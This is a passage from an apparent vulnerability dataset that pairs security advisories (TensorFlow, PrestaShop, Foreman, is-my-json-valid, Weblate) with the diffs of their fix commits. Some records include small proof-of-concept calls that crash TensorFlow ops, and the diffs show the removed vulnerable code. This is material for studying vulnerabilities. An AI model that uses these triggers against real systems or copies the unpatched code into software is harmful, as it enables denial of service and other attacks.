more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c1dc920d8ffb4893d6c9d27d1f039607b326743","commit_sha":"9c1dc920d8ffb4893d6c9d27d1f039607b326743","patch":"MULTI","chain_ord":"['9c1dc920d8ffb4893d6c9d27d1f039607b326743', 'c6173f5fe66cdbab74f4f869311fe6aae2ba35f4']","before_first_fix_commit":"{'46b80bd2a8943d5976dc83bd5c0322c0023255a7'}","last_fix_commit":"c6173f5fe66cdbab74f4f869311fe6aae2ba35f4","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:47:46","message":"Prevent infinite loop\/stack overflow in TFLite `while` op.\n\nPiperOrigin-RevId: 370800333\nChange-Id: I6a2e4ff849da339545c449db2af7e11ce6ff02c3","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/lite\/kernels\/while.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9c1dc920d8ffb4893d6c9d27d1f039607b326743\/tensorflow%2Flite%2Fkernels%2Fwhile.cc', 'patch': '@@ -138,6 +138,8 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n   auto* subgraphs = this_subgraph->GetSubgraphs();\\n   TF_LITE_ENSURE(context, op_data->cond_subgraph_index < subgraphs->size());\\n   TF_LITE_ENSURE(context, op_data->body_subgraph_index < subgraphs->size());\\n+  TF_LITE_ENSURE(context,\\n+                 op_data->cond_subgraph_index != op_data->body_subgraph_index);\\n \\n   Subgraph* cond_subgraph = (*subgraphs)[op_data->cond_subgraph_index].get();\\n   Subgraph* body_subgraph = (*subgraphs)[op_data->body_subgraph_index].get();'}}","message_norm":"prevent infinite loop\/stack overflow in tflite `while` op.\n\npiperorigin-revid: 370800333\nchange-id: i6a2e4ff849da339545c449db2af7e11ce6ff02c3","language":"en","entities":"[('prevent', 'ACTION', ''), ('infinite loop', 'SECWORD', ''), ('overflow', 'SECWORD', ''), ('370800333', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/while.cc'])","num_files":1.0},{"index":1632,"vuln_id":"GHSA-cx2r-mf6x-55rx","cwe_id":"{'CWE-79'}","score":4.1,"chain":"{'https:\/\/github.com\/PrestaShop\/ps_linklist\/commit\/83e6e0bdda2287f4d6e64127cb90c41d26b5ad82'}","dataset":"osv","summary":"Stored XSS with custom URLs in PrestaShop module ps_linklist ### Impact\nStored XSS when using custom URLs.\n\n### Patches\nThe problem is fixed in 3.1.0\n\n### References\n[Cross-site Scripting (XSS) - Stored (CWE-79)](https:\/\/cwe.mitre.org\/data\/definitions\/79.html)","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/PrestaShop\/ps_linklist","commit_href":"https:\/\/github.com\/PrestaShop\/ps_linklist\/commit\/83e6e0bdda2287f4d6e64127cb90c41d26b5ad82","commit_sha":"83e6e0bdda2287f4d6e64127cb90c41d26b5ad82","patch":"SINGLE","chain_ord":"['83e6e0bdda2287f4d6e64127cb90c41d26b5ad82']","before_first_fix_commit":"{'b90005c2cfed949ab564228b277a728e0a62a876', '632e61961553a5cdd4c12ad7218e914455dbaa6b'}","last_fix_commit":"83e6e0bdda2287f4d6e64127cb90c41d26b5ad82","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2020, 14:16:34","message":"Merge pull request from GHSA-cx2r-mf6x-55rx\n\nThe custom url field must be a valid url","author":"GoT","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'src\/Form\/Type\/CustomUrlType.php': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PrestaShop\/ps_linklist\/raw\/83e6e0bdda2287f4d6e64127cb90c41d26b5ad82\/src%2FForm%2FType%2FCustomUrlType.php', 'patch': \"@@ -29,6 +29,7 @@\\n use PrestaShopBundle\\\\Form\\\\Admin\\\\Type\\\\TranslatorAwareType;\\n use Symfony\\\\Component\\\\Form\\\\Extension\\\\Core\\\\Type\\\\TextType;\\n use Symfony\\\\Component\\\\Form\\\\FormBuilderInterface;\\n+use Symfony\\\\Component\\\\Validator\\\\Constraints as Assert;\\n \\n class CustomUrlType extends TranslatorAwareType\\n {\\n@@ -45,6 +46,7 @@ public function buildForm(FormBuilderInterface $builder, array $options)\\n             ->add('url', TextType::class, [\\n                 'label' => $this->trans('URL', 'Modules.Linklist.Admin'),\\n                 'required' => true,\\n+                'constraints' => [new Assert\\\\Url()],\\n             ])\\n         ;\\n     }\"}}","message_norm":"merge pull request from ghsa-cx2r-mf6x-55rx\n\nthe custom url field must be a valid url","language":"en","entities":"[('ghsa-cx2r-mf6x-55rx', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Form\/Type\/CustomUrlType.php'])","num_files":1.0},{"index":1649,"vuln_id":"GHSA-f2rp-4rv7-fc95","cwe_id":"{'CWE-200'}","score":7.8,"chain":"{'https:\/\/github.com\/theforeman\/foreman_fog_proxmox\/pull\/184\/commits\/b7e910bf61563f5d447c71b1b41e2a373a794d7b'}","dataset":"osv","summary":"Exposure of Sensitive Information to an Unauthorized Actor in foreman_fog_proxmox A flaw was found in the Foreman project. The Proxmox compute resource exposes the password through the API to an authenticated local attacker with view_hosts permission. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability. Versions before foreman_fog_proxmox 0.13.1 are affected","published_date":"2021-06-10","chain_len":1,"project":"https:\/\/github.com\/theforeman\/foreman_fog_proxmox","commit_href":"https:\/\/github.com\/theforeman\/foreman_fog_proxmox\/pull\/184\/commits\/b7e910bf61563f5d447c71b1b41e2a373a794d7b","commit_sha":"b7e910bf61563f5d447c71b1b41e2a373a794d7b","patch":"SINGLE","chain_ord":"['b7e910bf61563f5d447c71b1b41e2a373a794d7b']","before_first_fix_commit":"{'f131382d265944cda85bb5765a6dc5b0b2715f61'}","last_fix_commit":"b7e910bf61563f5d447c71b1b41e2a373a794d7b","chain_ord_pos":1.0,"commit_datetime":"02\/23\/2021, 21:00:19","message":"Fix clean API result","author":"Markus Bucher","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/views\/api\/v2\/compute_resources\/proxmox.json.rabl': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/theforeman\/foreman_fog_proxmox\/raw\/b7e910bf61563f5d447c71b1b41e2a373a794d7b\/app%2Fviews%2Fapi%2Fv2%2Fcompute_resources%2Fproxmox.json.rabl', 'patch': '@@ -1,3 +1,3 @@\\n # frozen_string_literal: true\\n \\n-attributes :url, :user, :password, :ssl_verify_peer, :ssl_certs, :renew\\n+attributes :url, :user, :ssl_verify_peer, :ssl_certs, :renew'}}","message_norm":"fix clean api result","language":"ro","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/views\/api\/v2\/compute_resources\/proxmox.json.rabl'])","num_files":1.0},{"index":1661,"vuln_id":"GHSA-f4rr-5m7v-wxcw","cwe_id":"{'CWE-843'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1'}","dataset":"osv","summary":"Type confusion leading to `CHECK`-failure based denial of service in TensorFlow ### Impact\nThe [macros that TensorFlow uses for writing assertions (e.g., `CHECK_LT`, `CHECK_GT`, etc.)](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/platform\/default\/logging.h) have an incorrect logic when comparing `size_t` and `int` values. Due to type conversion rules, several of the macros would trigger incorrectly.\n\n### Patches\nWe have patched the issue in GitHub commit [b917181c29b50cb83399ba41f4d938dc369109a1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1) (merging GitHub PR [#55730](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/55730)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/55530).","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1","commit_sha":"b917181c29b50cb83399ba41f4d938dc369109a1","patch":"SINGLE","chain_ord":"['b917181c29b50cb83399ba41f4d938dc369109a1']","before_first_fix_commit":"{'cce6f6484e967a0be4df8702c8ac36d021542455', 'd73521b7603f10e3029a2f1cd5067ca985738fc8'}","last_fix_commit":"b917181c29b50cb83399ba41f4d938dc369109a1","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 21:41:18","message":"Merge pull request #55730 from graphcore:awf\/issue-55530\n\nPiperOrigin-RevId: 445252025","author":"TensorFlower Gardener","comments":null,"stats":"{'additions': 73, 'deletions': 28, 'total': 101}","files":"{'tensorflow\/core\/platform\/default\/logging.h': {'additions': 73, 'deletions': 28, 'changes': 101, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b917181c29b50cb83399ba41f4d938dc369109a1\/tensorflow%2Fcore%2Fplatform%2Fdefault%2Flogging.h', 'patch': '@@ -85,7 +85,7 @@ class LogMessage : public std::basic_ostringstream<char> {\\n \/\/ that the ternary VLOG() implementation is balanced, type wise.\\n struct Voidifier {\\n   template <typename T>\\n-  void operator&(const T&)const {}\\n+  void operator&(const T&) const {}\\n };\\n \\n \/\/ LogMessageFatal ensures the process will exit in failure after\\n@@ -348,11 +348,13 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\\n }\\n \\n \/\/ Helper functions for CHECK_OP macro.\\n-\/\/ The (int, int) specialization works around the issue that the compiler\\n+\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\\n+\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\\n+\/\/ This happens if, for example, those are used as token names in a\\n+\/\/ yacc grammar.\\n+\/\/ The (int, int) overload works around the issue that the compiler\\n \/\/ will not instantiate the template version of the function on values of\\n \/\/ unnamed enum type - see comment below.\\n-\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\\n-\/\/ comparison errors while still being thorough with the comparison.\\n #define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\\\\n   template <typename T1, typename T2>                                     \\\\\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\\\\n@@ -364,34 +366,77 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\\n   }                                                                       \\\\\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\\\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\\\\n-  }                                                                       \\\\\\n-  inline string* name##Impl(const size_t v1, const int v2,                \\\\\\n-                            const char* exprtext) {                       \\\\\\n-    if (TF_PREDICT_FALSE(v2 < 0)) {                                       \\\\\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\\\\n-    }                                                                     \\\\\\n-    return name##Impl<size_t, size_t>(v1, v2, exprtext);                  \\\\\\n-  }                                                                       \\\\\\n-  inline string* name##Impl(const int v1, const size_t v2,                \\\\\\n-                            const char* exprtext) {                       \\\\\\n-    if (TF_PREDICT_FALSE(v2 >= std::numeric_limits<int>::max())) {        \\\\\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\\\\n-    }                                                                     \\\\\\n-    const size_t uval = (size_t)((unsigned)v2);                           \\\\\\n-    return name##Impl<size_t, size_t>(v1, uval, exprtext);                \\\\\\n   }\\n \\n-\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\\n-\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\\n-\/\/ This happens if, for example, those are used as token names in a\\n-\/\/ yacc grammar.\\n-TF_DEFINE_CHECK_OP_IMPL(Check_EQ,\\n-                        ==)  \/\/ Compilation error with CHECK_EQ(NULL, x)?\\n-TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)  \/\/ Use CHECK(x == NULL) instead.\\n+\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\\n+\/\/ comparison errors while still being thorough with the comparison.\\n+\\n+TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\\n+\/\/ Compilation error with CHECK_EQ(NULL, x)?\\n+\/\/ Use CHECK(x == NULL) instead.\\n+\\n+inline string* Check_EQImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (TF_PREDICT_FALSE(v1 < 0))\\n+    ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+\\n+  return Check_EQImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_EQImpl(size_t v1, int v2, const char* exprtext) {\\n+  return Check_EQImpl(v2, v1, exprtext);\\n+}\\n+\\n+TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\\n+\\n+inline string* Check_NEImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 < 0) return NULL;\\n+\\n+  return Check_NEImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_NEImpl(size_t v1, int v2, const char* exprtext) {\\n+  return Check_NEImpl(v2, v1, exprtext);\\n+}\\n+\\n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\\n+\\n+inline string* Check_LEImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 <= 0) return NULL;\\n+\\n+  return Check_LEImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_LEImpl(size_t v1, int v2, const char* exprtext) {\\n+  if (TF_PREDICT_FALSE(v2 < 0))\\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+  return Check_LEImpl(v1, size_t(v2), exprtext);\\n+}\\n+\\n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\\n-TF_DEFINE_CHECK_OP_IMPL(Check_GE, >=)\\n-TF_DEFINE_CHECK_OP_IMPL(Check_GT, >)\\n+\\n+inline string* Check_LTImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 < 0) return NULL;\\n+\\n+  return Check_LTImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_LTImpl(size_t v1, int v2, const char* exprtext) {\\n+  if (v2 < 0)\\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+  return Check_LTImpl(v1, size_t(v2), exprtext);\\n+}\\n+\\n+\/\/ Implement GE,GT in terms of LE,LT\\n+template <typename T1, typename T2>\\n+inline string* Check_GEImpl(const T1& v1, const T2& v2, const char* exprtext) {\\n+  return Check_LEImpl(v2, v1, exprtext);\\n+}\\n+\\n+template <typename T1, typename T2>\\n+inline string* Check_GTImpl(const T1& v1, const T2& v2, const char* exprtext) {\\n+  return Check_LTImpl(v2, v1, exprtext);\\n+}\\n+\\n #undef TF_DEFINE_CHECK_OP_IMPL\\n \\n \/\/ In optimized mode, use CheckOpString to hint to compiler that'}}","message_norm":"merge pull request #55730 from graphcore:awf\/issue-55530\n\npiperorigin-revid: 445252025","language":"en","entities":"[('#55730', 'ISSUE', ''), ('445252025', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/platform\/default\/logging.h'])","num_files":1.0},{"index":1662,"vuln_id":"GHSA-f522-ffg8-j8r6","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/mafintosh\/is-my-json-valid\/commit\/eca4beb21e61877d76fdf6bea771f72f39544d9b', 'https:\/\/github.com\/mafintosh\/is-my-json-valid\/commit\/b3051b277f7caa08cd2edc6f74f50aeda65d2976'}","dataset":"osv","summary":"Regular Expression Denial of Service in is-my-json-valid Version of `is-my-json-valid` before 1.4.1 or 2.17.2 are vulnerable to regular expression denial of service (ReDoS) via the email validation function.\n\n\n## Recommendation\n\nUpdate to version 1.4.1, 2.17.2 or later.","published_date":"2017-10-24","chain_len":2,"project":"https:\/\/github.com\/mafintosh\/is-my-json-valid","commit_href":"https:\/\/github.com\/mafintosh\/is-my-json-valid\/commit\/eca4beb21e61877d76fdf6bea771f72f39544d9b","commit_sha":"eca4beb21e61877d76fdf6bea771f72f39544d9b","patch":"MULTI","chain_ord":"['eca4beb21e61877d76fdf6bea771f72f39544d9b', 'b3051b277f7caa08cd2edc6f74f50aeda65d2976']","before_first_fix_commit":"{'5c6a43dedebf975508465b375af98e9afde2f49c', '767c6c0ee5e55c506ccd49141e7f31cb1910c47f'}","last_fix_commit":"b3051b277f7caa08cd2edc6f74f50aeda65d2976","chain_ord_pos":1.0,"commit_datetime":"01\/17\/2016, 21:55:32","message":"fix utc-millisec regex to avoid a ddos attack","author":"Mathias Buus","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'formats.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mafintosh\/is-my-json-valid\/raw\/eca4beb21e61877d76fdf6bea771f72f39544d9b\/formats.js', 'patch': \"@@ -11,4 +11,4 @@ exports['alpha'] = \/^[a-zA-Z]+$\/\\n exports['alphanumeric'] = \/^[a-zA-Z0-9]+$\/\\n exports['style'] = \/\\\\s*(.+?):\\\\s*([^;]+);?\/g\\n exports['phone'] = \/^\\\\+(?:[0-9] ?){6,14}[0-9]$\/\\n-exports['utc-millisec'] = \/^[0-9]+(\\\\.?[0-9]+)?$\/\\n+exports['utc-millisec'] = \/^[0-9]{1,15}\\\\.?[0-9]{0,15}$\/\"}}","message_norm":"fix utc-millisec regex to avoid a ddos attack","language":"en","entities":"[('fix', 'ACTION', ''), ('ddos', 'SECWORD', ''), ('attack', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['formats.js'])","num_files":1.0},{"index":1666,"vuln_id":"GHSA-f55g-x8qq-2569","cwe_id":"{'CWE-1236'}","score":9.8,"chain":"{'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/d9e136ff228e3760fd6dd7572869ac38e9a81809'}","dataset":"osv","summary":"CSV-Safe improperly filters special characters potentially leading to CSV injection CSV-Safe gem < 3.0.0 doesn't filter out special characters which could trigger CSV Injection.","published_date":"2022-05-03","chain_len":1,"project":"https:\/\/github.com\/WeblateOrg\/weblate","commit_href":"https:\/\/github.com\/WeblateOrg\/weblate\/commit\/d9e136ff228e3760fd6dd7572869ac38e9a81809","commit_sha":"d9e136ff228e3760fd6dd7572869ac38e9a81809","patch":"SINGLE","chain_ord":"['d9e136ff228e3760fd6dd7572869ac38e9a81809']","before_first_fix_commit":"{'66f55341916de8a9e9125bb4af661373fb5c525b'}","last_fix_commit":"d9e136ff228e3760fd6dd7572869ac38e9a81809","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2017, 15:19:46","message":"Improve filter on CSV formulas\n\nIt seems that Excel is interpreting way more than I originally thought.\n\nFixes https:\/\/hackerone.com\/reports\/223999\n\nSigned-off-by: Michal \u010ciha\u0159 <michal@cihar.com>","author":"Michal \u010ciha\u0159","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'weblate\/trans\/exporters.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WeblateOrg\/weblate\/raw\/d9e136ff228e3760fd6dd7572869ac38e9a81809\/weblate%2Ftrans%2Fexporters.py', 'patch': '@@ -279,6 +279,6 @@ def string_filter(self, text):\\n         used at first position of translatable strings, so the harm is not\\n         that big.\\n         \"\"\"\\n-        if text and text[0] in (\\'=\\', \\'+\\', \\'-\\', \\'@\\'):\\n-            return \"\\'\" + text\\n+        if text and text[0] in (\\'=\\', \\'+\\', \\'-\\', \\'@\\', \\'|\\', \\'%\\'):\\n+            return \"\\'{0}\\'\".format(text.replace(\\'|\\', \\'\\\\|\\'))\\n         return text'}}","message_norm":"improve filter on csv formulas\n\nit seems that excel is interpreting way more than i originally thought.\n\nfixes https:\/\/hackerone.com\/reports\/223999\n\nsigned-off-by: michal \u010diha\u0159 <michal@cihar.com>","language":"en","entities":"[('improve', 'ACTION', ''), ('fixes', 'ACTION', ''), ('https:\/\/hackerone.com\/reports\/223999', 'URL', ''), ('michal@cihar.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['weblate\/trans\/exporters.py'])","num_files":1.0},{"index":1669,"vuln_id":"GHSA-f5cx-5wr3-5qrc","cwe_id":"{'CWE-824'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7'}","dataset":"osv","summary":"Reference binding to nullptr in boosted trees ### Impact\nAn attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(\n  node_id_range=[],\n  stats_summary_list=[[1,2,3]],\n  l1=[1.0],\n  l2=[1.0],\n  tree_complexity =[1.0],\n  min_node_weight =[1.17],\n  max_splits=5)\n```\n\nA similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:\n\n```python\nimport tensorflow as tf\n                                                                                                                                                                                                                                                                                          \ntf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(\n  node_id_range=[],\n  stats_summaries_list=[[1,2,3]],\n  split_types=[''],\n  candidate_feature_ids=[1,2,3,4],\n  l1=[1],     \n  l2=[1],\n  tree_complexity=[1.0],\n  min_node_weight=[1.17],\n  logits_dimension=5)\n```     \n    \nThe  [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc) does not validate the input values.\n\n### Patches\nWe have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad","commit_sha":"9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad","patch":"MULTI","chain_ord":"['9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad', '429f009d2b2c09028647dd4bb7b3f6f414bbaad7']","before_first_fix_commit":"{'4f8db85aa9ab71a71e95d5acce7de52a0b195661'}","last_fix_commit":"429f009d2b2c09028647dd4bb7b3f6f414bbaad7","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 19:11:33","message":"Disallow empty node_id_range in tf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2 and tf.raw_ops.BoostedTreesCalculateBestGainsPerFeature\n\nPiperOrigin-RevId: 387165936\nChange-Id: I2f70341af96236b2776c2a592c917d549c1fc1e2","author":"Laura Pak","comments":null,"stats":"{'additions': 20, 'deletions': 0, 'total': 20}","files":"{'tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc': {'additions': 20, 'deletions': 0, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fstats_ops.cc', 'patch': '@@ -51,6 +51,16 @@ class BoostedTreesCalculateBestGainsPerFeatureOp : public OpKernel {\\n     \/\/ node_id_range\\n     const Tensor* node_id_range_t;\\n     OP_REQUIRES_OK(context, context->input(\"node_id_range\", &node_id_range_t));\\n+    OP_REQUIRES(\\n+        context, node_id_range_t->dims() == 1,\\n+        errors::InvalidArgument(\"node_id_range must be a rank 1 tensor, but \"\\n+                                \"given node_id_range has dims of \",\\n+                                node_id_range_t->dims()));\\n+    OP_REQUIRES(context, node_id_range_t->dim_size(0) == 2,\\n+                errors::InvalidArgument(\\n+                    \"node_id_range must be a rank 1 tensor with shape=[2], but \"\\n+                    \"given node_id_range has shape \",\\n+                    node_id_range_t->dim_size(0), \" on its first dim\"));\\n     const auto node_id_range = node_id_range_t->vec<int32>();\\n     const int32_t node_id_first = node_id_range(0);  \/\/ inclusive\\n     const int32_t node_id_last = node_id_range(1);   \/\/ exclusive\\n@@ -570,6 +580,16 @@ class BoostedTreesCalculateBestFeatureSplitV2 : public OpKernel {\\n     const Tensor* node_id_range_t;\\n     OP_REQUIRES_OK(context, context->input(\"node_id_range\", &node_id_range_t));\\n     const auto node_id_range = node_id_range_t->vec<int32>();\\n+    OP_REQUIRES(\\n+        context, node_id_range_t->dims() == 1,\\n+        errors::InvalidArgument(\"node_id_range must be a rank 1 tensor, but \"\\n+                                \"given node_id_range has dims of \",\\n+                                node_id_range_t->dims()));\\n+    OP_REQUIRES(context, node_id_range_t->dim_size(0) == 2,\\n+                errors::InvalidArgument(\\n+                    \"node_id_range must be a rank 1 tensor with shape=[2], but \"\\n+                    \"given node_id_range has shape \",\\n+                    node_id_range_t->dim_size(0), \" on its first dim\"));\\n     const int32_t node_id_first = node_id_range(0);  \/\/ Inclusive.\\n     const int32_t node_id_last = node_id_range(1);   \/\/ Exclusive.'}}","message_norm":"disallow empty node_id_range in tf.raw_ops.boostedtreescalculatebestfeaturesplitv2 and tf.raw_ops.boostedtreescalculatebestgainsperfeature\n\npiperorigin-revid: 387165936\nchange-id: i2f70341af96236b2776c2a592c917d549c1fc1e2","language":"en","entities":"[('387165936', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc'])","num_files":1.0},{"index":1670,"vuln_id":"GHSA-f5cx-5wr3-5qrc","cwe_id":"{'CWE-824'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7'}","dataset":"osv","summary":"Reference binding to nullptr in boosted trees ### Impact\nAn attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(\n  node_id_range=[],\n  stats_summary_list=[[1,2,3]],\n  l1=[1.0],\n  l2=[1.0],\n  tree_complexity =[1.0],\n  min_node_weight =[1.17],\n  max_splits=5)\n```\n\nA similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:\n\n```python\nimport tensorflow as tf\n                                                                                                                                                                                                                                                                                          \ntf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(\n  node_id_range=[],\n  stats_summaries_list=[[1,2,3]],\n  split_types=[''],\n  candidate_feature_ids=[1,2,3,4],\n  l1=[1],     \n  l2=[1],\n  tree_complexity=[1.0],\n  min_node_weight=[1.17],\n  logits_dimension=5)\n```     \n    \nThe  [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc) does not validate the input values.\n\n### Patches\nWe have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 